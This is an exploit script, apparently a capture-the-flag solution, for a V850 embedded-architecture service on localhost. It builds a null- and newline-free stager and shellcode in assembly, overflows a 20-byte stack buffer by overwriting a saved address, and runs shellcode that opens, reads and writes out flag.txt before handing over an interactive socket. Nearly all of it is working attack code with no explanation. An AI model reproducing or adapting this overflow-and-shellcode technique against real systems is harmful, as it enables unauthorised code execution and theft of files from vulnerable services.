stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
# 15b0:	e0 51       	cmp	r0, r10
    xor r8, r8
    movea 0x15b2, r8, r8
    # 0x00 == nop
    xor r9, r9
    st.w r9, -2[r8
    jr 0x1400 - (0x1ae4 + 114)
.ascii "%s"
'''
asm = '''.section .text
.global _start
.ascii "%s"
_start:
    jr get_addr
ret:
    st.w    lp, 0[sp
    ld.w    0[sp], r11
open:
    mov r11, r7
    xor r7, r8
    xor r8, r9
    mov     5, r6
    trap    31
read:
    mov r7, r8
    xor r10, r7
    xor r8, r7
    mov r11, r8
    xor r9, r9
    movea   0x7f, r9, r9
    mov     3, r6
    trap    31
write:
    mov 1, r7
    mov r11, r8
    xor r9, r9
    movea   0x7f, r9, r9
    mov     4, r6
    trap    31
exit:
    mov     1   , r6
    trap    31
get_addr:
    jarl ret, lp
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'v850'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'
BUF_SIZE = 20

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > BUF_SIZE:
    raise Exception('too long')
stager = stager.ljust(BUF_SIZE, 'A')

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)
IP = '127.0.0.1'
PORT = 10011
s = mysock(IP, PORT)

sl(s, '\n000')
SP = 0x1ae4
first = stager + p(SP)[0:2] + '\n'
sl(s, first)

sl(s, '\n000')
SP = 0x1afc
shellcode = 'A' * BUF_SIZE + p(SP) + shellcode + '\n'
sl(s, shellcode)

shell(s)

'''
r31 == lr
'''
